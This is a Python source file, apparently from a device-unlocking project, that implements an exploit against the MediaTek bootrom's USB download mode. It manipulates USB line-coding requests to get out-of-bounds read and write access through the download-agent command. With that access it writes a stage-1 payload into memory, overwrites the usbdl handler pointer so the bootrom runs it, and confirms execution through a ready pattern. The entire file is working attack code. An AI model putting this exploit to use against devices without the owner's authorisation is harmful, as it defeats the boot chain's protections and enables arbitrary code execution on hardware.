from __future__ import annotations

import contextlib
import struct
from typing import TYPE_CHECKING

from firebreak.amonet.payload import NotReadyError
from firebreak.mediatek.usbdl import WORD_SIZE, UsbdlError

if TYPE_CHECKING:
    from collections.abc import Iterable

    from firebreak.mediatek.libusb import Usb
    from firebreak.mediatek.usbdl import Bootrom

ASCENT = range(5, 8)
LONG_DESCENT = range(-2, -6, -1)
NEAR = 0x40
PAYLOAD_ADDRESS = 0x100A00
POINTER_DA = 0xD7AC
POINTER_SKEW = 8
POINTER_USBDL = 0xD2E4
SHORT_DESCENT = range(-2, -5, -1)
STAGE1_LIMIT = 0xA00
STAGE1_READY = b"\xa1\xa2\xa3\xa4"
WATCHDOG_RESTART = 0x10007050


class Exploit:
    def __init__(self, *, bootrom: Bootrom, port: Usb) -> None:
        self.bootrom = bootrom
        self.coding = port.line_coding() + b"\0"
        self.port = port

    def _reached(
        self,
        *,
        data: bytes = b"",
        length: int,
        offset: int,
        read_status: bool = True,
        write: bool = False,
    ) -> bytes:
        self.nudge()
        self._walk(offsets=ASCENT)
        near = offset < NEAR
        self._walk(offsets=LONG_DESCENT if near else SHORT_DESCENT)
        return self.bootrom.command_da(
            data=data,
            length=length,
            offset=offset if near else offset - NEAR,
            read_status=read_status,
            write=write,
        )

    def _walk(self, *, offsets: Iterable[int]) -> None:
        for offset in offsets:
            self.port.set_line_coding(
                data=self.coding + struct.pack("<I", POINTER_DA + offset)
            )
            self.port.configuration_descriptor()

    def nudge(self) -> None:
        with contextlib.suppress(OSError, UsbdlError):
            self.bootrom.command_da(length=1, offset=0)
            self.bootrom.read_words(address=WATCHDOG_RESTART, count=1)

    def read(self, *, length: int, offset: int) -> bytes:
        return self._reached(length=length, offset=offset)

    def write(self, *, data: bytes, offset: int, read_status: bool = True) -> None:
        self._reached(
            data=data,
            length=len(data),
            offset=offset,
            read_status=read_status,
            write=True,
        )


def start_stage1(*, bootrom: Bootrom, port: Usb, stage1: bytes) -> None:
    if len(stage1) >= STAGE1_LIMIT:
        message = f"stage1 is {len(stage1)} bytes, and {STAGE1_LIMIT} is the room"
        raise ValueError(message)
    exploit = Exploit(bootrom=bootrom, port=port)
    held = exploit.read(length=WORD_SIZE, offset=POINTER_USBDL)
    send = struct.unpack("<I", held)[0] + POINTER_SKEW
    exploit.write(data=stage1, offset=PAYLOAD_ADDRESS)
    exploit.write(
        data=struct.pack("<I", PAYLOAD_ADDRESS), offset=send, read_status=False
    )
    ready = bootrom.read_exactly(
        label="stage 1 ready pattern", length=len(STAGE1_READY)
    )
    if ready != STAGE1_READY:
        message = f"stage 1's ready pattern: expected {STAGE1_READY!r}, got {ready!r}"
        raise NotReadyError(message)
